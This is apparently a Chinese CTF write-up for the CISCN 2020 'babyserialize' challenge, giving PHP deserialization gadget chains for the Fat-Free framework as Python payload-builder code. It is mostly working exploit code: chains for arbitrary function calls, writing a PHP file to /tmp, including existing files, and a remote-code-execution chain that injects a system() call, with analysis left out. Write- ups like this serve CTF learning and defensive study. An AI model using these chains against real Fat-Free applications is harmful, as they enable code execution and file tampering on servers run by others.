---
title: fatfree framework POP链挖掘
date: 2020-08-21
tags:
    - CTF
    - Writeup
    - CISCN
---

Web狗无法在险恶的CTF世界中存活

CISCN2020 落幕，web所有题加起来还不如misc/crypto/re题的零头，吐了

这里写一下babyserialize的题的题解，其它题有心情了再写

## babyserialize

前段时间在WMCTF中挖的链被断掉了，稍微改一改

第一次见flag直接放phpinfo里头的。。。找了半天没找到。。。

在这里把挖到的几条链都放一下吧

### 单个任意参数调用任意函数

```python
@namespace('CLI')
class WS:
    # call func with one param
    def __init__(self, func, param):
        @namespace('CLI')
        class Agent():
            class Base:
                @namespace('DB\\Jig')
                class Mapper:
                    @namespace('DB\\SQL')
                    class Mapper:
                        protected_props = {'read': func}
                    protected_file = param
                    protected_db = Mapper()
                events = {'disconnect': [Mapper(), 'insert']}
            protected_server = Base()
        self.a = Agent()  # autoload
# payload: serialize(WS())
```

### 任意文件写

```python
@namespace('DB')
class Jig:
    # write file
    lazy = True
    data = {'frankli.php': {
        'asdf': '<?php phpinfo();exit();?>'
    }}
    dir = '/tmp/'
    format = 0
```

### 任意（存在的）文件包含

结合上面调用函数的链调用`\View->render`

```python
class View:
    # arbitrary **exisiting** file inclusion
    class Base:
        TEMP = '/tmp/'
        UI = '/tmp/'
    fw = Base()

print(ses.get(url, params={'flag': serialize(
    WS([View(), 'render'], 'frankli.php'))}
).text)
```

### wmctf的时候挖的rce链

结合上面调用函数的链调用`\Preview->resolve`  
然而这次`resolve`被删了  

```python
@namespace('CLI')
class WS:
    @namespace('CLI')
    class Agent():
        class F3:  # 随便一个存在的类
            class Preview:
                class Base:
                    hive = {'node': f'<?php system("ls");die(1);?>'}
                fw = Base()
            events = {'disconnect': [Preview(), 'resolve']}
        server = F3()
    a = Agent()
```

入口点和上面函数调用的是一样的

分析没心情写了。。
